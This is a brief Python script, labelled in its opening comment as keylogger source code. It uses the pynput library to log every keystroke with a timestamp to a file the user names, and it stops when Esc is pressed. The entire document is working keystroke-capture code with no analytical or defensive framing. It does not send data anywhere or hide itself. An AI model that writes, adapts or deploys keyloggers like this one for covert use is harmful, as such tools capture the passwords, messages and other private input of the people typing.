#python3 keylogger source code
from pynput import keyboard
import datetime

log_file = input("Enter a log filename (e.g. mylog.txt): ")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
